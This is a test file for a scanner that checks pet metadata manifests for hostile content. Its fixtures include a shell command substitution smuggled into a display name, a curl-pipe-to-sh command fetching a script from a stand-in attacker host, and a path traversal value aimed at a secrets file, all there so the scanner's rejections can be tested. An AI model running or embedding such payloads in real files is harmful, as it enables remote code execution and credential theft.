import { describe, expect, it } from "bun:test";

import { scanPetManifestsSecurity, scanPetSecurity } from "@/lib/pet-security";

describe("scanPetSecurity", () => {
  it("passes normal pet metadata", () => {
    const result = scanPetSecurity({
      petJson: {
        id: "boba",
        displayName: "Boba",
        description: "A tiny companion.",
        spritesheetPath: "spritesheet.webp",
        states: {
          idle: { row: 0, frames: 8 },
        },
      },
      displayName: "Boba",
      description: "A tiny companion.",
    });

    expect(result.decision).toBe("pass");
    expect(result.findings).toEqual([]);
  });

  it("fails shell command substitution payloads", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba $(touch /tmp/pwned)",
        spritesheetPath: "spritesheet.webp",
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings[0]?.code).toBe("shell_command_substitution");
    expect(result.findings[0]?.severity).toBe("fail");
    expect(result.findings[0]?.path).toBe("$.displayName");
  });

  it("fails executable metadata keys", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        command: "curl https://attacker.example/p.sh | sh",
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "executable_metadata_key",
    );
  });

  it("holds external URLs without auto-rejecting", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        homepage: "https://example.com/boba",
      },
    });

    expect(result.decision).toBe("hold");
    expect(result.findings[0]?.code).toBe("external_url_in_pet_json");
    expect(result.findings[0]?.severity).toBe("hold");
  });

  it("fails path traversal in path-like keys", () => {
    const result = scanPetSecurity({
      petJson: {
        displayName: "Boba",
        spritesheetPath: "../secrets/.env",
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "path_traversal",
    );
  });

  it("redacts sensitive values from findings and reasons", () => {
    const result = scanPetSecurity({
      petJson: {
        apiKey: "sk-live-real-secret-value",
        description: "reads process.env.OPENAI_API_KEY",
      },
    });
    const serialized = JSON.stringify(result);

    expect(result.decision).toBe("fail");
    expect(serialized).not.toContain("sk-live-real-secret-value");
    expect(serialized).not.toContain("OPENAI_API_KEY");
    expect(serialized).toContain("[redacted]");
  });

  it("fails malicious zip pet.json even when standalone pet.json is clean", () => {
    const result = scanPetManifestsSecurity({
      petJson: { displayName: "Boba", states: { idle: { row: 0 } } },
      zipPetJson: {
        displayName: "Boba $(touch /tmp/pwned)",
        states: { idle: { row: 0 } },
      },
    });

    expect(result.decision).toBe("fail");
    expect(result.findings.map((finding) => finding.path)).toContain(
      "zip.petJson.displayName",
    );
    expect(result.findings.map((finding) => finding.code)).toContain(
      "pet_json_manifest_mismatch",
    );
  });

  it("holds when standalone and zip pet manifests differ", () => {
    const result = scanPetManifestsSecurity({
      petJson: { displayName: "Boba", states: { idle: { row: 0 } } },
      zipPetJson: { displayName: "Boba", states: { idle: { row: 1 } } },
    });

    expect(result.decision).toBe("hold");
    expect(result.findings.map((finding) => finding.code)).toContain(
      "pet_json_manifest_mismatch",
    );
  });
});
